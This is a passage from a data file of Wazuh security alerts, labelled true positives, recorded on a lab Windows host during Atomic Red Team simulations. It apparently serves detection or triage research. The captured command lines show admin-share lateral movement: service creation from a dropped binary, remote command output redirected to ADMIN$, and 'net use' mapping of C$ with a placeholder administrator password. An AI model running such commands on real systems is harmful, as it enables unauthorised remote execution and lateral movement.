["T1543.003"], "tactic": ["Persistence", "Privilege Escalation"]}, "id": "92307"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751804294.21876743", "timestamp": "2025-07-06T12:18:14.264+0000"}, "fields": {"timestamp": ["2025-07-06T12:18:14.264Z"]}, "sort": [1751804294264]}}
{"id": "AAqs35cBiGYaRV9XU7DQ", "description": "New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.", "label": "TP", "rule_level": 12, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "AAqs35cBiGYaRV9XU7DQ", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"serviceType": "user mode service", "accountName": "LocalSystem", "imagePath": "%systemroot%\\\\UbntCfHC.exe", "startType": "demand start", "serviceName": "XIfn"}, "system": {"eventID": "7045", "eventSourceName": "Service Control Manager", "keywords": "0x8080000000000000", "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "level": "4", "channel": "System", "opcode": "0", "message": "\"A service was installed in the system.\r\n\r\nService Name:  XIfn\r\nService File Name:  %systemroot%\\UbntCfHC.exe\r\nService Type:  user mode service\r\nService Start Type:  demand start\r\nService Account:  LocalSystem\"", "version": "0", "systemTime": "2025-07-06T12:18:13.3525585Z", "eventRecordID": "3282", "threadID": "4344", "computer": "Win11Client.soclab.internal", "task": "0", "processID": "908", "severityValue": "INFORMATION", "providerName": "Service Control Manager"}}}, "rule": {"firedtimes": 1, "mail": true, "description": "New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.", "groups": ["win_evt_channel", "windows"], "mitre": {"technique": ["SMB/Windows Admin Shares", "Service Execution"], "id": ["T1021.002", "T1569.002"], "tactic": ["Lateral Movement", "Execution"]}, "id": "92650"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751804294.21872217", "timestamp": "2025-07-06T12:18:14.147+0000"}, "fields": {"timestamp": ["2025-07-06T12:18:14.147Z"]}, "sort": [1751804294147]}}
{"id": "AQqs35cBiGYaRV9XU7DQ", "description": "Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process", "label": "TP", "rule_level": 6, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "AQqs35cBiGYaRV9XU7DQ", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"image": "System", "processGuid": "{ff3427f9-51d0-686a-eb03-000000000000}", "processId": "4", "utcTime": "2025-07-06 12:18:13.254", "targetFilename": "C:\\\\Windows\\\\UbntCfHC.exe", "creationUtcTime": "2025-07-06 12:18:13.254", "user": "NT AUTHORITY\\\\SYSTEM"}, "system": {"eventID": "11", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"File created:\r\nRuleName: -\r\nUtcTime: 2025-07-06 12:18:13.254\r\nProcessGuid: {ff3427f9-51d0-686a-eb03-000000000000}\r\nProcessId: 4\r\nImage: System\r\nTargetFilename: C:\\Windows\\UbntCfHC.exe\r\nCreationUtcTime: 2025-07-06 12:18:13.254\r\nUser: NT AUTHORITY\\SYSTEM\"", "version": "2", "systemTime": "2025-07-06T12:18:13.2567127Z", "eventRecordID": "873112", "threadID": "3716", "computer": "Win11Client.soclab.internal", "task": "11", "processID": "3024", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process", "groups": ["sysmon", "sysmon_eid11_detections", "windows"], "mitre": {"technique": ["Lateral Tool Transfer"], "id": ["T1570"], "tactic": ["Lateral Movement"]}, "id": "92218"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751804294.21874361", "timestamp": "2025-07-06T12:18:14.203+0000"}, "fields": {"timestamp": ["2025-07-06T12:18:14.203Z"]}, "sort": [1751804294203]}}
{"id": "LQoB4JcBiGYaRV9XrbNy", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "LQoB4JcBiGYaRV9XrbNy", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "hostname.exe", "image": "C:\\\\Windows\\\\System32\\\\HOSTNAME.EXE", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-7f54-686a-0f06-000000001600}", "description": "Hostname APP", "logonGuid": "{ff3427f9-5f92-686a-d1e8-3b0200000000}", "parentCommandLine": "cmd.exe  /Q /c hostname", "processGuid": "{ff3427f9-7f54-686a-1006-000000001600}", "logonId": "0x23be8d1", "parentProcessId": "3964", "processId": "6328", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-06 13:51:16.231", "hashes": "SHA1=4BD0421A6428638B02F19F69BDA6AB9A4C18755B,MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "hostname", "integrityLevel": "High", "fileVersion": "10.0.26100.2161 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "2", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-06 13:51:16.231\r\nProcessGuid: {ff3427f9-7f54-686a-1006-000000001600}\r\nProcessId: 6328\r\nImage: C:\\Windows\\System32\\HOSTNAME.EXE\r\nFileVersion: 10.0.26100.2161 (WinBuild.160101.0800)\r\nDescription: Hostname APP\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: hostname.exe\r\nCommandLine: hostname  \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-5f92-686a-d1e8-3b0200000000}\r\nLogonId: 0x23BE8D1\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=4BD0421A6428638B02F19F69BDA6AB9A4C18755B,MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB\r\nParentProcessGuid: {ff3427f9-7f54-686a-0f06-000000001600}\r\nParentProcessId: 3964\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: cmd.exe  /Q /c hostname \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-06T13:51:16.2326785Z", "eventRecordID": "875737", "threadID": "3716", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3024", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 4, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751809894.25874095", "timestamp": "2025-07-06T13:51:34.402+0000"}, "fields": {"timestamp": ["2025-07-06T13:51:34.402Z"]}, "sort": [1751809894402]}}
{"id": "KwoB4JcBiGYaRV9XrbNy", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "KwoB4JcBiGYaRV9XrbNy", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-60b8-686a-0404-000000001600}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-5f92-686a-d1e8-3b0200000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-7f54-686a-0d06-000000001600}", "logonId": "0x23be8d1", "parentProcessId": "6808", "processId": "6744", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-06 13:51:16.152", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c cmd.exe /Q /c hostname 1&gt; \\\\\\\\127.0.0.1\\\\ADMIN$\\\\output.txt 2&gt;&amp;1", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "2", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-06 13:51:16.152\r\nProcessGuid: {ff3427f9-7f54-686a-0d06-000000001600}\r\nProcessId: 6744\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-5f92-686a-d1e8-3b0200000000}\r\nLogonId: 0x23BE8D1\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-60b8-686a-0404-000000001600}\r\nParentProcessId: 6808\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-06T13:51:16.1538801Z", "eventRecordID": "875731", "threadID": "3716", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3024", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 3, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751809894.25861553", "timestamp": "2025-07-06T13:51:34.238+0000"}, "fields": {"timestamp": ["2025-07-06T13:51:34.238Z"]}, "sort": [1751809894238]}}
{"id": "Cwr_35cBiGYaRV9XyLPp", "description": "Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process", "label": "TP", "rule_level": 6, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "Cwr_35cBiGYaRV9XyLPp", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"image": "System", "processGuid": "{ff3427f9-51d0-686a-eb03-000000000000}", "processId": "4", "utcTime": "2025-07-06 13:49:18.827", "targetFilename": "C:\\\\Windows\\\\PSEXESVC.exe", "creationUtcTime": "2025-07-04 20:41:00.770", "user": "NT AUTHORITY\\\\SYSTEM"}, "system": {"eventID": "11", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"File created:\r\nRuleName: -\r\nUtcTime: 2025-07-06 13:49:18.827\r\nProcessGuid: {ff3427f9-51d0-686a-eb03-000000000000}\r\nProcessId: 4\r\nImage: System\r\nTargetFilename: C:\\Windows\\PSEXESVC.exe\r\nCreationUtcTime: 2025-07-04 20:41:00.770\r\nUser: NT AUTHORITY\\SYSTEM\"", "version": "2", "systemTime": "2025-07-06T13:49:18.8285706Z", "eventRecordID": "875684", "threadID": "3716", "computer": "Win11Client.soclab.internal", "task": "11", "processID": "3024", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process", "groups": ["sysmon", "sysmon_eid11_detections", "windows"], "mitre": {"technique": ["Lateral Tool Transfer"], "id": ["T1570"], "tactic": ["Lateral Movement"]}, "id": "92218"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751809769.25754605", "timestamp": "2025-07-06T13:49:29.405+0000"}, "fields": {"timestamp": ["2025-07-06T13:49:29.405Z"]}, "sort": [1751809769405]}}
{"id": "DAr_35cBiGYaRV9XyLPp", "description": "Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process", "label": "TP", "rule_level": 6, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "DAr_35cBiGYaRV9XyLPp", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"image": "System", "processGuid": "{ff3427f9-51d0-686a-eb03-000000000000}", "processId": "4", "utcTime": "2025-07-06 13:49:19.323", "targetFilename": "C:\\\\Windows\\\\cmd.exe", "creationUtcTime": "2025-07-06 13:49:19.323", "user": "NT AUTHORITY\\\\SYSTEM"}, "system": {"eventID": "11", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"File created:\r\nRuleName: -\r\nUtcTime: 2025-07-06 13:49:19.323\r\nProcessGuid: {ff3427f9-51d0-686a-eb03-000000000000}\r\nProcessId: 4\r\nImage: System\r\nTargetFilename: C:\\Windows\\cmd.exe\r\nCreationUtcTime: 2025-07-06 13:49:19.323\r\nUser: NT AUTHORITY\\SYSTEM\"", "version": "2", "systemTime": "2025-07-06T13:49:19.3247597Z", "eventRecordID": "875688", "threadID": "3716", "computer": "Win11Client.soclab.internal", "task": "11", "processID": "3024", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 2, "mail": false, "description": "Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process", "groups": ["sysmon", "sysmon_eid11_detections", "windows"], "mitre": {"technique": ["Lateral Tool Transfer"], "id": ["T1570"], "tactic": ["Lateral Movement"]}, "id": "92218"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751809769.25756987", "timestamp": "2025-07-06T13:49:29.470+0000"}, "fields": {"timestamp": ["2025-07-06T13:49:29.470Z"]}, "sort": [1751809769470]}}
{"id": "AAr_35cBiGYaRV9XubNR", "description": "Powershell script used \"Invoke-command\" cmdlet to execute sub script", "label": "TP", "rule_level": 12, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "AAr_35cBiGYaRV9XubNR", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"path": "C:\\\\AtomicRedTeam\\\\invoke-atomicredteam\\\\Private\\\\Invoke-ExecuteCommand.ps1", "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "function Invoke-ExecuteCommand ($finalCommand, $executor, $executionPlatform, $TimeoutSeconds, $session = $null, $interactive) {     $null = @(         if ($null -eq $finalCommand) { return 0 }         $finalCommand = $finalCommand.trim()         Write-Verbose -Message 'Invoking Atomic Tests using defined executor'         if ($executor -eq \\\"command_prompt\\\" -or $executor -eq \\\"sh\\\" -or $executor -eq \\\"bash\\\") {             $execPrefix = \\\"-c\\\"             $execExe = $executor             if ($executor -eq \\\"command_prompt\\\") {                 $execPrefix = \\\"/c\\\";                 $execExe = \\\"cmd.exe\\\";                 $execCommand = $finalCommand -replace \\\"`n\\\", \\\" &amp; \\\"                 $arguments = $execPrefix, \\\"$execCommand\\\"             }             else {                 $finalCommand = $finalCommand -replace \\\"[\\\\\\\\](?!;)\\\", \\\"`\\\\$&amp;\\\"                 $finalCommand = $finalCommand -replace \\\"[`\\\"]\\\", \\\"`\\\\$&amp;\\\"                 $execCommand = $finalCommand -replace \\\"(?&lt;!;)\\\\n\\\", \\\"; \\\"                 $arguments = \\\"$execPrefix `\\\"$execCommand`\\\"\\\"              }         }         elseif ($executor -eq \\\"powershell\\\") {             $execCommand = $finalCommand -replace \\\"`\\\"\\\", \\\"`\\\\`\\\"`\\\"\\\"             if ($session) {                 if ($executionPlatform -eq \\\"windows\\\") {                     $execExe = \\\"powershell.exe\\\"                 }                 else {                     $execExe = \\\"pwsh\\\"                 }             }             else {                 $execExe = \\\"powershell.exe\\\"; if ($IsLinux -or $IsMacOS) { $execExe = \\\"pwsh\\\" }             }             if ($execExe -eq \\\"pwsh\\\") {                 $arguments = \\\"-Command $execCommand\\\"             }             else {                 $arguments = \\\"&amp; {$execCommand}\\\"             }         }         else {             Write-Warning -Message \\\"Unable to generate or execute the command line properly. Unknown executor\\\"             return [PSCustomObject]@{                 StandardOutput = \\\"\\\"                 ErrorOutput    = \\\"\\\"                 ExitCode       = -1                 IsTimeOut      = $false             }         }          # Write-Host -ForegroundColor Magenta \\\"$execExe $arguments\\\"         if ($session) {             $scriptParentPath = Split-Path $import -Parent             $publicPath = Join-Path (Split-Path $scriptParentPath -Parent) \\\"Public\\\"             $fp = Join-Path $scriptParentPath \\\"Invoke-Process.ps1\\\"             $fp2 = Join-Path $publicPath \\\"Invoke-KillProcessTree.ps1\\\"             invoke-command -Session $session -FilePath $fp             invoke-command -Session $session -FilePath $fp2             $res = invoke-command -Session $session -ScriptBlock { Invoke-Process -filename $Using:execExe -Arguments $Using:arguments -TimeoutSeconds $Using:TimeoutSeconds -stdoutFile \\\"art-out.txt\\\" -stderrFile \\\"art-err.txt\\\" }         }         else {             if ($interactive) {                 # This use case is: Local execution of tests that contain interactive prompts                 #   In this situation, let the stdout/stderr flow to the console                 $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds             }             else {                 # Local execution that DO NOT contain interactive prompts                 #   In this situation, capture the stdout/stderr for Invoke-AtomicTest to send to the caller                 $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds -stdoutFile \\\"art-out.txt\\\" -stderrFile \\\"art-err.txt\\\"             }         }     )     $res }", "scriptBlockId": "1e36dd25-eac3-4ad6-8657-b58ed5423be7"}, "system": {"eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\nfunction Invoke-ExecuteCommand ($finalCommand, $executor, $executionPlatform, $TimeoutSeconds, $session = $null, $interactive) {\n    $null = @(\n        if ($null -eq $finalCommand) { return 0 }\n        $finalCommand = $finalCommand.trim()\n        Write-Verbose -Message 'Invoking Atomic Tests using defined executor'\n        if ($executor -eq \"command_prompt\" -or $executor -eq \"sh\" -or $executor -eq \"bash\") {\n            $execPrefix = \"-c\"\n            $execExe = $executor\n            if ($executor -eq \"command_prompt\") {\n                $execPrefix = \"/c\";\n                $execExe = \"cmd.exe\";\n                $execCommand = $finalCommand -replace \"`n\", \" & \"\n                $arguments = $execPrefix, \"$execCommand\"\n            }\n            else {\n                $finalCommand = $finalCommand -replace \"[\\\\](?!;)\", \"`\\$&\"\n                $finalCommand = $finalCommand -replace \"[`\"]\", \"`\\$&\"\n                $execCommand = $finalCommand -replace \"(?<!;)\\n\", \"; \"\n                $arguments = \"$execPrefix `\"$execCommand`\"\"\n\n            }\n        }\n        elseif ($executor -eq \"powershell\") {\n            $execCommand = $finalCommand -replace \"`\"\", \"`\\`\"`\"\"\n            if ($session) {\n                if ($executionPlatform -eq \"windows\") {\n                    $execExe = \"powershell.exe\"\n                }\n                else {\n                    $execExe = \"pwsh\"\n                }\n            }\n            else {\n                $execExe = \"powershell.exe\"; if ($IsLinux -or $IsMacOS) { $execExe = \"pwsh\" }\n            }\n            if ($execExe -eq \"pwsh\") {\n                $arguments = \"-Command $execCommand\"\n            }\n            else {\n                $arguments = \"& {$execCommand}\"\n            }\n        }\n        else {\n            Write-Warning -Message \"Unable to generate or execute the command line properly. Unknown executor\"\n            return [PSCustomObject]@{\n                StandardOutput = \"\"\n                ErrorOutput    = \"\"\n                ExitCode       = -1\n                IsTimeOut      = $false\n            }\n        }\n\n        # Write-Host -ForegroundColor Magenta \"$execExe $arguments\"\n        if ($session) {\n            $scriptParentPath = Split-Path $import -Parent\n            $publicPath = Join-Path (Split-Path $scriptParentPath -Parent) \"Public\"\n            $fp = Join-Path $scriptParentPath \"Invoke-Process.ps1\"\n            $fp2 = Join-Path $publicPath \"Invoke-KillProcessTree.ps1\"\n            invoke-command -Session $session -FilePath $fp\n            invoke-command -Session $session -FilePath $fp2\n            $res = invoke-command -Session $session -ScriptBlock { Invoke-Process -filename $Using:execExe -Arguments $Using:arguments -TimeoutSeconds $Using:TimeoutSeconds -stdoutFile \"art-out.txt\" -stderrFile \"art-err.txt\" }\n        }\n        else {\n            if ($interactive) {\n                # This use case is: Local execution of tests that contain interactive prompts\n                #   In this situation, let the stdout/stderr flow to the console\n                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds\n            }\n            else {\n                # Local execution that DO NOT contain interactive prompts\n                #   In this situation, capture the stdout/stderr for Invoke-AtomicTest to send to the caller\n                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds -stdoutFile \"art-out.txt\" -stderrFile \"art-err.txt\"\n            }\n        }\n    )\n    $res\n}\n\r\n\r\nScriptBlock ID: 1e36dd25-eac3-4ad6-8657-b58ed5423be7\r\nPath: C:\\AtomicRedTeam\\invoke-atomicredteam\\Private\\Invoke-ExecuteCommand.ps1\"", "version": "1", "systemTime": "2025-07-06T13:49:14.1755387Z", "eventRecordID": "19223", "threadID": "5556", "computer": "Win11Client.soclab.internal", "task": "2", "processID": "6688", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell"}}}, "rule": {"firedtimes": 4, "mail": true, "description": "Powershell script used \"Invoke-command\" cmdlet to execute sub script", "groups": ["windows", " powershell"], "mitre": {"technique": ["PowerShell"], "id": ["T1059.001"], "tactic": ["Execution"]}, "id": "91822"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751809766.25651571", "timestamp": "2025-07-06T13:49:26.072+0000"}, "fields": {"timestamp": ["2025-07-06T13:49:26.072Z"]}, "sort": [1751809766072]}}
{"id": "5Ar_35cBiGYaRV9XubJR", "description": "A C:\\\\Windows\\\\System32\\\\net.exe binary was started by a Windows cmd shell", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "5Ar_35cBiGYaRV9XubJR", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "net.exe", "image": "C:\\\\Windows\\\\System32\\\\net.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-7ed2-686a-fc05-000000001600}", "description": "Net Command", "logonGuid": "{ff3427f9-5f92-686a-d1e8-3b0200000000}", "parentCommandLine": "cmd.exe  /c \\\"net use \\\\\\\\Target\\\\C$ P@ssw0rd1 /u:DOMAIN\\\\Administrator\\\"", "processGuid": "{ff3427f9-7ed2-686a-fd05-000000001600}", "logonId": "0x23be8d1", "parentProcessId": "8364", "processId": "5628", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-06 13:49:06.722", "hashes": "SHA1=EE89579561980FCD4E9A8D4FDB147134A289EC0F,MD5=864842D77174D93A0EABF89879A43569,SHA256=2F3D1A52FC7D1DDFAB34B290BCEB31F03E13B658B31C3914E954DBA877009F26,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1018,technique_name=Remote System Discovery", "company": "Microsoft Corporation", "commandLine": "net  use \\\\\\\\Target\\\\C$ P@ssw0rd1 /u:DOMAIN\\\\Administrator", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "2", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1018,technique_name=Remote System Discovery\r\nUtcTime: 2025-07-06 13:49:06.722\r\nProcessGuid: {ff3427f9-7ed2-686a-fd05-000000001600}\r\nProcessId: 5628\r\nImage: C:\\Windows\\System32\\net.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net.exe\r\nCommandLine: net  use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-5f92-686a-d1e8-3b0200000000}\r\nLogonId: 0x23BE8D1\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=EE89579561980FCD4E9A8D4FDB147134A289EC0F,MD5=864842D77174D93A0EABF89879A43569,SHA256=2F3D1A52FC7D1DDFAB34B290BCEB31F03E13B658B31C3914E954DBA877009F26,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75\r\nParentProcessGuid: {ff3427f9-7ed2-686a-fc05-000000001600}\r\nParentProcessId: 8364\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: cmd.exe  /c \"net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator\"\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-06T13:49:06.7251603Z", "eventRecordID": "875637", "threadID": "3716", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3024", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "A C:\\\\Windows\\\\System32\\\\net.exe binary was started by a Windows cmd shell", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell", "DLL Search Order Hijacking"], "id": ["T1059.003", "T1574.001"], "tactic": ["Execution", "Persistence", "Privilege Escalation", "Defense Evasion"]}, "id": "92036"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751809758.25198657", "timestamp": "2025-07-06T13:49:18.778+0000"}, "fields": {"timestamp": ["2025-07-06T13:49:18.778Z"]}, "sort": [1751809758778]}}
